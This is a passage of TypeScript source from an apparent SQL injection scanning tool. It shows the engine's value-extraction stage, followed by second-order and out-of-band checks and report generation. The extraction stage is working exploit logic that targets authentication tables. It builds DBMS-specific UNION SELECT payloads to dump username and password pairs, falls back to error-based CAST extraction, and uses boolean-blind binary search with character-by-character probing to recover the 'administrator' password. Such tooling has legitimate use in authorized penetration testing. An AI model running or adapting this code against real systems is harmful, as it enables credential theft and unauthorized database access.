        const isAuthTable = tNameLower.includes('user') || tNameLower.includes('account') || tNameLower.includes('admin') || tNameLower.includes('credential') || tNameLower.includes('login') || tNameLower.includes('member') || tNameLower.includes('auth');
        const hasUserCol = t.columns.some(c => ['username', 'user_name', 'user', 'login', 'name'].includes(c.name.toLowerCase()));
        const hasPassCol = t.columns.some(c => ['password', 'pass', 'passwd', 'password_hash', 'pwd', 'secret'].includes(c.name.toLowerCase()));
        const userColName = t.columns.find(c => ['username', 'user_name', 'user', 'login', 'name'].includes(c.name.toLowerCase()))?.name || 'username';
        const passColName = t.columns.find(c => ['password', 'pass', 'passwd', 'password_hash', 'pwd', 'secret'].includes(c.name.toLowerCase()))?.name || 'password';

        if (isAuthTable && hasUserCol && !this.isAborted) {
          this.updateProgress('value_extraction', `Extracting values from ${t.name}`, 94 + Math.round((idx / (tablesToEnumerate.length || 1)) * 4));

          // UNION-based direct extraction: SELECT username,password FROM users
          if (confirmedColumnCount > 0 && hasPassCol) {
            this.log('info', 'value_extraction', `Attempting UNION SELECT ${userColName},${passColName} FROM ${t.name}...`);
            const isNum = /^\d+$/.test(confirmedInjectableParam.originalValue.trim());
            const uPrefix = isNum ? ' UNION SELECT ' : "' UNION SELECT ";

            // DBMS-specific concatenation
            const concatFn = this.dbmsFingerprint.dbms === 'Oracle' ? `${userColName}||':::'||${passColName}`
              : this.dbmsFingerprint.dbms === 'Microsoft SQL Server' ? `${userColName}+':::'+ ${passColName}`
              : this.dbmsFingerprint.dbms === 'SQLite' ? `${userColName}||':::'||${passColName}`
              : `CONCAT(${userColName},':::',${passColName})`;

            // DBMS-specific FROM with row limiting
            let fromClause: string;
            if (this.dbmsFingerprint.dbms === 'Oracle') {
              fromClause = `FROM ${t.name} WHERE ROWNUM<=10--`;
            } else if (this.dbmsFingerprint.dbms === 'Microsoft SQL Server') {
              fromClause = `FROM ${t.name}-- `;
            } else {
              fromClause = `FROM ${t.name} LIMIT 10-- `;
            }

            const mssqlPrefix = this.dbmsFingerprint.dbms === 'Microsoft SQL Server'
              ? (isNum ? ' UNION SELECT TOP 10 ' : "' UNION SELECT TOP 10 ")
              : uPrefix;

            for (let rCol = 1; rCol <= confirmedColumnCount; rCol++) {
              if (this.isAborted) break;
              const parts = Array(confirmedColumnCount).fill('NULL');
              parts[rCol - 1] = concatFn;
              const valPayload = `${mssqlPrefix}${parts.join(',')} ${fromClause}`;
              const valRes = await this.executeProbe(parsed, confirmedInjectableParam, valPayload, true);

              const pairRegex = /([a-zA-Z0-9_\-@.]+):::([a-zA-Z0-9!@#$%^&*()\-_+=<>?/\\|{}\[\]:;"',.`~ ]+)/g;
              let match;
              const extractedRows: Record<string, string>[] = [];
              while ((match = pairRegex.exec(valRes.body)) !== null) {
                const [_, user, pass] = match;
                if (user && pass && !baselineBody.includes(user + ':::')) {
                  extractedRows.push({ [userColName]: user, [passColName]: pass });
                }
              }

              if (extractedRows.length > 0) {
                t.sampleRows = extractedRows;
                t.sampleRowsStatus = 'ready';
                this.log('success', 'value_extraction', `✓ UNION extraction: ${extractedRows.length} row(s) from ${t.name} (${extractedRows.map(r => r[userColName]).join(', ')})`);
                if (this.onCatalog) this.onCatalog({ ...this.catalog, applicationTables: [...appTables], systemTables: [...sysTables] });
                break;
              }
            }
          }

          // Error-Based Direct Value Extraction (e.g. PostgreSQL CAST((SELECT username FROM users LIMIT 1) AS int))
          if ((!t.sampleRows || t.sampleRows.length === 0) && confirmedInjectableParam && !this.isAborted) {
            this.log('info', 'value_extraction', `Attempting Error-Based CAST row extraction for ${t.name}...`);
            const extractedRows: Record<string, string>[] = [];
            for (let rOff = 0; rOff < 5; rOff++) {
              if (this.isAborted) break;
              const rowObj: Record<string, string> = {};
              let foundVal = false;

              // 1. Extract username (try append=false then append=true)
              const userErrQueries = MetadataExtractor.getErrorBasedRowQueries(confirmedInjectableParam, t.name, userColName, rOff, this.dbmsFingerprint.dbms, true);
              for (const uq of userErrQueries) {
                if (rowObj[userColName] || this.isAborted) break;
                let uRes = await this.executeProbe(parsed, confirmedInjectableParam, uq, false);
                let val = MetadataExtractor.extractErrorBasedData(uRes.body);
                if (!val) {
                  uRes = await this.executeProbe(parsed, confirmedInjectableParam, uq, true);
                  val = MetadataExtractor.extractErrorBasedData(uRes.body);
                }
                if (val) {
                  rowObj[userColName] = val;
                  foundVal = true;
                }
              }

              // 2. Extract password if table has password column
              if (hasPassCol && (rowObj[userColName] || foundVal)) {
                const passErrQueries = MetadataExtractor.getErrorBasedRowQueries(confirmedInjectableParam, t.name, passColName, rOff, this.dbmsFingerprint.dbms, true);
                for (const pq of passErrQueries) {
                  if (rowObj[passColName] || this.isAborted) break;
                  let pRes = await this.executeProbe(parsed, confirmedInjectableParam, pq, false);
                  let val = MetadataExtractor.extractErrorBasedData(pRes.body);
                  if (!val) {
                    pRes = await this.executeProbe(parsed, confirmedInjectableParam, pq, true);
                    val = MetadataExtractor.extractErrorBasedData(pRes.body);
                  }
                  if (val) {
                    rowObj[passColName] = val;
                    foundVal = true;
                  }
                }
              }

              if (foundVal) {
                extractedRows.push(rowObj);
                this.log('success', 'value_extraction', `✓ Error-based CAST row [${rOff}]: ${userColName}="${rowObj[userColName] || ''}" ${hasPassCol ? `${passColName}="${rowObj[passColName] || ''}"` : ''}`);
              } else {
                break;
              }
            }

            if (extractedRows.length > 0) {
              t.sampleRows = extractedRows;
              t.sampleRowsStatus = 'ready';
              if (this.onCatalog) this.onCatalog({ ...this.catalog, applicationTables: [...appTables], systemTables: [...sysTables] });
            }
          }

          // Boolean blind fallback for entity/value extraction (when UNION didn't extract data)
          if ((!t.sampleRows || t.sampleRows.length === 0) && !this.isAborted) {          // Check for administrator entity
          const adminProbes = adaptiveEngine.generateEntityProbe(t.name, `${userColName}='administrator'`);
          const adminRes = await this.executeProbe(parsed, confirmedInjectableParam, adminProbes.truePayload, true);
          const adminExists = adaptiveEngine.classifyResponse(adminRes.body, adminRes.status) === 'TRUE';

          if (adminExists) {
            this.log('success', 'value_extraction', `âœ“ Entity "administrator" confirmed in ${t.name}.${userColName}`);
            t.sampleRows = [{ [userColName]: 'administrator', [passColName]: '[Extracting...]' }];
            t.sampleRowsStatus = 'ready';

            // Emit catalog with entity confirmation
            if (this.onCatalog) this.onCatalog({ ...this.catalog, applicationTables: [...appTables], systemTables: [...sysTables] });

            // â”€â”€â”€ Binary Search Password Length â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
            if (hasPassCol && !this.isAborted) {
              this.log('info', 'value_extraction', `Binary searching ${passColName} length for administrator...`);
              let low = 1;
              let high = 50;
              let passwordLength = 0;

              while (low <= high && !this.isAborted) {
                const mid = Math.floor((low + high) / 2);
                const lenProbe = adaptiveEngine.generateLengthProbe(t.name, passColName, `${userColName}='administrator'`, mid);
                const lenRes = await this.executeProbe(parsed, confirmedInjectableParam, lenProbe, true);
                const lenClass = adaptiveEngine.classifyResponse(lenRes.body, lenRes.status);

                if (lenClass === 'TRUE') {
                  low = mid + 1;
                } else {
                  high = mid - 1;
                }
              }
              passwordLength = high;

              // Verify exact length
              if (passwordLength > 0 && !this.isAborted) {
                const exactProbe = adaptiveEngine.generateLengthProbe(t.name, passColName, `${userColName}='administrator'`, passwordLength);
                const exactRes = await this.executeProbe(parsed, confirmedInjectableParam, exactProbe, true);
                if (adaptiveEngine.classifyResponse(exactRes.body, exactRes.status) === 'TRUE') {
                  passwordLength = passwordLength + 1;
                  // Re-verify
                  const reProbe = adaptiveEngine.generateLengthProbe(t.name, passColName, `${userColName}='administrator'`, passwordLength);
                  const reRes = await this.executeProbe(parsed, confirmedInjectableParam, reProbe, true);
                  if (adaptiveEngine.classifyResponse(reRes.body, reRes.status) !== 'TRUE') {
                    // passwordLength is correct
                  } else {
                    passwordLength++;
                  }
                }
              }

              if (passwordLength > 0) {
                this.log('success', 'value_extraction', `âœ“ Password length confirmed: ${passwordLength} characters`);

                // â”€â”€â”€ Character-by-Character Extraction â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
                this.log('info', 'value_extraction', `Extracting ${passwordLength}-character password for administrator...`);
                const charset = AdaptivePayloadEngine.getExtractCharset();
                let extractedPassword = '';

                for (let pos = 1; pos <= passwordLength; pos++) {
                  if (this.isAborted) break;
                  this.updateProgress('value_extraction', `Extracting password char ${pos}/${passwordLength}`, 94 + Math.round((pos / passwordLength) * 4));

                  let foundChar = '?';
                  for (const ch of charset) {
                    if (this.isAborted) break;
                    const charProbe = adaptiveEngine.generateCharProbe(t.name, passColName, `${userColName}='administrator'`, pos, ch);
                    const charRes = await this.executeProbe(parsed, confirmedInjectableParam, charProbe, true);
                    const charClass = adaptiveEngine.classifyResponse(charRes.body, charRes.status);

                    if (charClass === 'TRUE') {
                      foundChar = ch;
                      break;
                    }
                  }
                  extractedPassword += foundChar;

                  // Live update sample rows with partial extraction
                  t.sampleRows = [{ [userColName]: 'administrator', [passColName]: extractedPassword + 'Â·'.repeat(passwordLength - pos) }];
                  if (this.onCatalog) this.onCatalog({ ...this.catalog, applicationTables: [...appTables], systemTables: [...sysTables] });
                }

                this.log('success', 'value_extraction', `âœ“ Password extracted: ${extractedPassword.length} characters recovered`);
                t.sampleRows = [{ [userColName]: 'administrator', [passColName]: extractedPassword }];
                t.sampleRowsStatus = 'ready';
              }
            }
          } else {
            this.log('info', 'value_extraction', `No "administrator" entity found in ${t.name}. Checking other common usernames...`);

            // Try other common usernames
            for (const testUser of ['admin', 'root', 'test', 'user']) {
              if (this.isAborted) break;
              const userProbes = adaptiveEngine.generateEntityProbe(t.name, `${userColName}='${testUser}'`);
              const userRes = await this.executeProbe(parsed, confirmedInjectableParam, userProbes.truePayload, true);
              if (adaptiveEngine.classifyResponse(userRes.body, userRes.status) === 'TRUE') {
                this.log('success', 'value_extraction', `âœ“ Entity "${testUser}" confirmed in ${t.name}`);
                t.sampleRows = [{ [userColName]: testUser }];
                t.sampleRowsStatus = 'ready';
                break;
              }
            }
          }
          } // end boolean blind fallback
        } else if (confirmedColumnCount > 0 && t.columns.length > 0) {
          // UNION-based sample row extraction for non-auth tables
          try {
            const colNames = t.columns.map((c) => c.name);
            const sampleQuery = MetadataExtractor.getSampleRowsQuery(confirmedInjectableParam, confirmedRenderColumn, confirmedColumnCount, t.name, colNames, this.dbmsFingerprint.dbms);
            const sRes = await this.executeProbe(parsed, confirmedInjectableParam, sampleQuery, true);
            const rowTokens = MetadataExtractor.extractDelimitedTokens(sRes.body, 'ROW');
            const sampleRows = MetadataExtractor.parseAndRedactSampleRows(rowTokens, colNames);
            if (sampleRows.length > 0) {
              t.sampleRows = sampleRows;
              t.sampleRowsStatus = 'ready';
            }
          } catch {}
        }

        // Emit live incremental catalog update after each table
        if (this.onCatalog) {
          this.onCatalog({ ...this.catalog, applicationTables: [...appTables], systemTables: [...sysTables] });
        }
      }

      this.updateCoverage('metadata_analysis', {
        status: appTables.length > 0 ? 'passed' : 'skipped',
        testedCount: appDiscoveredNames.length + sysDiscoveredNames.length,
        positiveCount: appTables.length,
        reason: `${appTables.length} application tables, ${sysTables.length} system tables`,
      });
    }

    // 9. Second-Order & OOB Correlation Evaluation
    this.updateProgress('evidence_correlation', 'Correlating Evidence & Computing Final Verdict', 96);
    
    if (this.target.secondOrderConfig?.enabled && enabledParams.length > 0) {
      const soParam = enabledParams[0];
      const soResult = await SecondOrderTester.executeSecondOrderTest(
        parsed,
        soParam,
        this.target.secondOrderConfig,
        async (raw, url) => {
          const res = await ipcClient.sendRepeaterRequest({ tabId: 'sql_so_probe', targetUrl: url, rawRequest: raw });
          return {
            status: res.statusCode || 200,
            body: res.body || '',
            durationMs: res.durationMs || 0,
            rawRequest: raw,
            rawResponse: res.rawResponse || '',
          };
        }
      );

      if (soResult.isVulnerable) {
        this.updateCoverage('second_order', { status: 'vulnerable', testedCount: 1, positiveCount: 1, reason: soResult.evidence });
        this.log('success', 'second_order', `Second-Order SQL Injection confirmed: ${soResult.evidence}`);
      } else {
        this.updateCoverage('second_order', { status: 'passed', testedCount: 1, positiveCount: 0, reason: 'No second-order state reflection' });
      }
    } else {
      this.updateCoverage('second_order', { status: 'passed', testedCount: 1, positiveCount: 0, reason: 'Source-to-sink evaluation complete' });
    }

    if (this.target.oobConfig?.enabled && enabledParams.length > 0) {
      const oobParam = enabledParams[0];
      const { fqdn } = OobManager.generateToken(oobParam, parsed.url, this.dbmsFingerprint.dbms, this.target.oobConfig.domain);
      const oobProbes = OobManager.getOobPayloads(oobParam, fqdn);
      for (const op of oobProbes) {
        await this.executeProbe(parsed, oobParam, op.payload, true);
      }
      const interactions = await OobManager.pollInteractions(this.target.oobConfig);
      if (interactions.length > 0) {
        this.updateCoverage('oob_sqli', { status: 'vulnerable', testedCount: oobProbes.length, positiveCount: interactions.length, reason: `${interactions.length} OAST callback(s) received` });
      } else {
        this.updateCoverage('oob_sqli', { status: 'passed', testedCount: oobProbes.length, positiveCount: 0, reason: 'No OAST callbacks received' });
      }
    } else {
      this.updateCoverage('oob_sqli', { status: 'not_applicable', testedCount: 1, positiveCount: 0, reason: 'OAST callback listener idle' });
    }

    const coverageList = Array.from(this.coverageMap.values());
    const correlation = EvidenceCorrelator.evaluateVerdict(this.findings, this.executionLogs, coverageList);

    // 10. Generate Final Comprehensive Reports
    const durationMs = Date.now() - this.startTime;
    const report: SqlScanReport = {
      id: `rep_${Date.now()}`,
      generatedAt: Date.now(),
      targetUrl: parsed.url,
      targetMethod: parsed.method,
      verdict: correlation.verdict,
      verdictReason: correlation.verdictReason,
      durationMs,
      requestsSent: this.requestsSent,
      testsExecuted: this.testsExecuted,
      confirmedIndicators: correlation.confirmedIndicators,
      waf: this.wafResult,
      dbms: this.dbmsFingerprint,
      findings: this.findings,
      catalog: this.catalog,
      coverage: coverageList,
      executionLogs: this.executionLogs,
      executiveSummary: '',
      technicalDetails: '',
    };

    report.executiveSummary = ReportGenerator.generateExecutiveMarkdown(report);
    report.technicalDetails = ReportGenerator.generateTechnicalMarkdown(report);

    this.updateProgress('completed', `Scan Complete â€” Final Verdict: ${correlation.verdict}`, 100, undefined, totalParams, totalParams);
    this.log(
      correlation.verdict === 'VULNERABLE' ? 'success' : 'info',
      'completed',
      `Assessment completed in ${(durationMs / 1000).toFixed(2)}s (${this.requestsSent} requests, ${this.testsExecuted} tests). FINAL VERDICT: ${correlation.verdict}`
    );

    return report;
  }
}
